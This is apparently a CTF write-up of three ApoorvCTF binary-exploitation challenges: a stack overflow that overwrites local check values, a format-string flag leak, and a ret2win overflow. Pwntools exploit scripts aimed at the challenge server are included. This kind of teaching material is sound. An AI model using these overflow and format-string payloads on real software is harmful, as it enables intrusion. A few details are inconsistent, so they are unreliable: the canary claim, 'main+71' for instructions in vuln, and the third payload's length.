--- 
title: BInary Exploitation : ApoorvCTF - PWN
date: 2025-03-02 
categories: [CTF, Writeups] 
tags: [ctf, buffer overflow, format string] 
author: 
description: A walkthrough of the pwn challenge from the ApoorvCTF.

-----------------------------------------------------------------------------------------------
## Kogarashi Café - The Forbidden Recipe 


Description
The final test. One last order, one last chance. Choose carefully—the café remembers.

solution:
we get a ELF file , 
```
─$ file forbidden_recipe    
forbidden_recipe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-  
linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1033e4a4b053363f711f388f116277a1cbde252, not stripped
```
- It is a **32-bit** binary.
- **Not stripped**, making analysis easier.
   Security Checks
```
└─$ pwn checksec forbidden_recipe  
[*] '/home/hyder/pra_ctf/apoorv/pwn/kogarashi3/files/forbidden_recipe'  
   Arch:       i386-32-little  
   RELRO:      Partial RELRO  
   Stack:      No canary found  
   NX:         NX enabled  
   PIE:        No PIE (0x8048000)  
   Stripped:   No
```
- **No stack canary** → Possible buffer overflow.
- **NX enabled** → No direct shellcode execution.
- **No PIE** → Predictable memory addresses.
Using **Ghidra**, we find a function `vuln()`:    
```

void vuln(void)

{
  undefined local_34 [32];
  int local_14;
  int local_10;
  
  local_10 = 0;
  local_14 = 0;
  puts(&DAT_080487c8);
  puts("Barista: \'I remember you... what will it be this time?\'");
  read(0,local_34,0x28);
  if ((local_10 == 0xc0ff33) && (local_14 == -0x21350453)) {
    puts("Barista: \'Ah... I knew you\'d figure it out. One moment.\'");
    win();
  }
  else {
    printf("Barista: \'Hmm... that\'s not quite right. Order codes: 0x%x, 0x%x\'\n",local_10,
           local_14);
    puts("Barista: \'Try again, I know you\'ll get it.\'");
  }
  return;
}
```

Then, from the code, we can see that there is an `if` check that compares with a constant value. If true, it calls the `win()` function and prints the flag. However, the two variables are initially set to 0. Then I remembered that when we run the ELF file
```
└─$ ./forbidden_recipe    
Welcome back to Kogarashi Café.  
Barista: 'I remember you... what will it be this time?'  
hello  
Barista: 'Hmm... that's not quite right. Order codes: 0x0, 0x0'  
Barista: 'Try again, I know you'll get it.'
```
There is a value leak from the program, so I thought it might be related to the two variables `local_10` and `local_14`. I considered using Python's `pwn` library with `cyclic` to overwrite these values and find the offset
```
└─$ ./forbidden_recipe                                             
Welcome back to Kogarashi Café.  
Barista: 'I remember you... what will it be this time?'  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa  
Barista: 'Hmm... that's not quite right. Order codes: 0x6161616a, 0x61616169'  
Barista: 'Try again, I know you'll get it.'
```
We can see that the values have been changed. Next, I found the offset using `cyclic_find()`.
```
>>> cyclic_find(0x6161616a)
36
>>> cyclic_find(0x61616169)
32
```
The offsets are 32 and 36. So, we need to adjust the payload to fit our desired values at those offsets. To find both values, I used GDB to analyze the disassembled code
```
pwndbg> disass vuln  
Dump of assembler code for function vuln:  
  0x080485e6 <+0>:     push   ebp  
  0x080485e7 <+1>:     mov    ebp,esp  
  0x080485e9 <+3>:     sub    esp,0x38  
  0x080485ec <+6>:     mov    DWORD PTR [ebp-0xc],0x0  
  0x080485f3 <+13>:    mov    DWORD PTR [ebp-0x10],0x0  
  0x080485fa <+20>:    sub    esp,0xc  
  0x080485fd <+23>:    push   0x80487c8  
  0x08048602 <+28>:    call   0x8048430 <puts@plt>  
  0x08048607 <+33>:    add    esp,0x10  
  0x0804860a <+36>:    sub    esp,0xc  
  0x0804860d <+39>:    push   0x80487ec  
  0x08048612 <+44>:    call   0x8048430 <puts@plt>  
  0x08048617 <+49>:    add    esp,0x10  
  0x0804861a <+52>:    sub    esp,0x4  
  0x0804861d <+55>:    push   0x28  
  0x0804861f <+57>:    lea    eax,[ebp-0x30]  
  0x08048622 <+60>:    push   eax  
  0x08048623 <+61>:    push   0x0  
  0x08048625 <+63>:    call   0x80483f0 <read@plt>  
  0x0804862a <+68>:    add    esp,0x10  
  0x0804862d <+71>:    cmp    DWORD PTR [ebp-0xc],0xc0ff33  
  0x08048634 <+78>:    jne    0x8048656 <vuln+112>  
  0x08048636 <+80>:    cmp    DWORD PTR [ebp-0x10],0xdecafbad  
  0x0804863d <+87>:    jne    0x8048656 <vuln+112>  
  0x0804863f <+89>:    sub    esp,0xc  
  0x08048642 <+92>:    push   0x8048824  
  0x08048647 <+97>:    call   0x8048430 <puts@plt>  
  0x0804864c <+102>:   add    esp,0x10  
  0x0804864f <+105>:   call   0x804856b <win>  
  0x08048654 <+110>:   jmp    0x804867c <vuln+150>  
  0x08048656 <+112>:   sub    esp,0x4  
  0x08048659 <+115>:   push   DWORD PTR [ebp-0x10]  
  0x0804865c <+118>:   push   DWORD PTR [ebp-0xc]  
  0x0804865f <+121>:   push   0x8048860  
  0x08048664 <+126>:   call   0x8048400 <printf@plt>  
  0x08048669 <+131>:   add    esp,0x10  
  0x0804866c <+134>:   sub    esp,0xc  
  0x0804866f <+137>:   push   0x80488a4  
  0x08048674 <+142>:   call   0x8048430 <puts@plt>  
  0x08048679 <+147>:   add    esp,0x10  
  0x0804867c <+150>:   nop  
  0x0804867d <+151>:   leave  
  0x0804867e <+152>:   ret  
End of assembler dump.
```
We can see the `cmp` instructions at `main+71` and `main+80`, where the values compared are `0xc0ff33` and `0xdecafbad`. By placing these values at the corresponding offsets in little-endian format, we can get the flag.
Exploit.py
```
from pwn import *  
context.log_level = 'critical'  
elf = context.binary = ELF('./forbidden_recipe')  
  
gdbscript = '''  
break *main  
continue  
'''  
  
if args.REMOTE:  
   p = remote('chals1.apoorvctf.xyz', 3002)  
elif args.GDB:  
    p = gdb.debug(elf.path, gdbscript=gdbscript)  
else:  
   p = process(elf.path)     
  
log.info("\\\\n==== start exploit ====\\\\n")  
p.recvuntil(b"Barista: 'I remember you... what will it be this time?'")  
payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaa\xad\xfb\xca\xde3\xff\xc0\x00'  
p.sendline(payload)  
print(p.recv())  
p.interactive()
```



------------------------------------------------------------------------

## Kogarashi Café - The Secret Blend


Description:
Not everything on the menu is meant to be seen.

solution:
from the ELF file,
```
└─$ file secret_blend    
secret_blend: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=00003bb9e0cd2a32ea61c4b60004ed82aa94d4a9, not stripped
```
This is the same as above: a 32-bit LSB executable and not stripped.
security checks,
```
└─$ pwn checksec secret_blend    
[*] '/home/hyder/pra_ctf/apoorv/pwn/kogarashi2/files/secret_blend'  
   Arch:       i386-32-little  
   RELRO:      Partial RELRO  
   Stack:      No canary found  
   NX:         NX enabled  
   PIE:        No PIE (0x8048000)  
   Stripped:   No
```
This binary has Partial RELRO, No PIE, and Canary enabled. So, let's take a look at the disassembled code.
```
void vuln(void)

{
  char local_b4 [64];
  char local_74 [100];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Barista: \'The special blend is missing...(create flag.txt)\'");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_b4,0x40,local_10);
  fclose(local_10);
  puts("Barista: \'What will you have?\'");
  fgets(local_74,100,stdin);
  printf(local_74);
  putchar(10);
  return;
}

```
We can see that the program opens the `flag.txt` file and prints 'missing' if the file is not found.

From the code, we notice a `printf` call after `fgets` without a format specifier. This indicates a format string vulnerability.

So, let's leak some values.
```
└─$ nc chals1.apoorvctf.xyz 3003  
Welcome to Kogarashi Café.  
Barista: 'What will you have?'  
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %P %p    
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %P %p  
0xd12481 0xfbad2288 0xff2edb7f 0xd124dd (nil) 0x746376726f6f7061 0x334d5f3368547b66 0x736b34334c5f756e 0x68545f6572304d5f 0x68535f74495f6e61 0x7d646c7530 0x404050 0x7fc514f2d5e0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0  
x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252050 (nil) 0xd122a0 0x7fffa88540a0 0x401278 %P 0x1
```
then after some multiple tries , we can find that 
```
0x746376726f6f7061 0x334d5f3368547b66 0x736b34334c5f756e 0x68545f6572304d5f 0x68535f74495f6e61 0x7d646c7530 0x404050 0x7f8dbb82b5e0 0x7025207025207025 0x2520702520702520 0x2070252070252070
```
these values are not changing each run , so i tried to convert it in to ASCHII  , which didnt go as planned ,
```
F7g&ö÷3M_3hT{f6³C4Å÷VàhT_er0M_5÷Döæ}dlu0 »µàRRP% p% p% RR
```
since this is not in the readable form ,
then i manually changed the endian of this and converted to the ASCII value like 
0x746376726f6f7061 -> 61706f6f72766374 ...

then the flag is apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}.

------------------------------------------------------------------------

## Kogarashi Café - The First Visit

Description:
A quiet café, a simple question. The barista waits, but your order may mean more than it seems.

solution:
```
└─$ file first_visit    
first_visit: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux  
.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ddf24eef326cd1ee996fc66f78c48a6eab6d9b87, not stripped
```
This is the same as above: a 32-bit LSB executable .
security check:
```
└─$ pwn checksec first_visit    
[*] '/home/hyder/pra_ctf/apoorv/pwn/kogarashi/files/first_visit'  
   Arch:       i386-32-little  
   RELRO:      Partial RELRO  
   Stack:      No canary found  
   NX:         NX enabled  
   PIE:        No PIE (0x8048000)  
   Stripped:   No
```
Since there is no canary, there is a buffer overflow vulnerability. Let's take a look at the code
```
void order_coffee(void)

{
  char local_2c [40];
  
  puts(&DAT_08048786);
  puts("Barista: \'What will you have?\'");
  gets(local_2c);
  printf("Barista: \'%s... interesting choice.\'\n",local_2c);
  puts("Brewing...");
  return;
}
```
From Ghidra, we can see a function named `brew_coffee()`, which is our win function that prints the flag. Since the program uses `gets()`, we can input a large value to overflow the buffer, overwrite the return address, and change the control flow to the `brew_coffee()` function.

By the cyclic( ), we can find the offset to the return address by Analyzing it in GDB .
```
>>> cyclic_find(0x6161616c)  
44
```
the offset is found to be 44 and the brew_coffee( ) function address is 0x0804856b. 

Exploit.py
```
from pwn import *  
context.log_level = 'critical'  
elf = context.binary = ELF('./first_visit')  
  
gdbscript = '''  
break *main  
continue  
'''  
  
if args.REMOTE:  
   p = remote('chals1.apoorvctf.xyz', 3001)  
elif args.GDB:  
    p = gdb.debug(elf.path, gdbscript=gdbscript)  
else:  
   p = process(elf.path)     
  
log.info("\\\\n==== start exploit ====\\\\n")  
p.recvuntil(b"'What will you have?'")  
payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaak\x85\x04\x08'  
p.sendline(payload)  
print(p.recv())  
p.interactive()
```
note : the address is in little-endian.

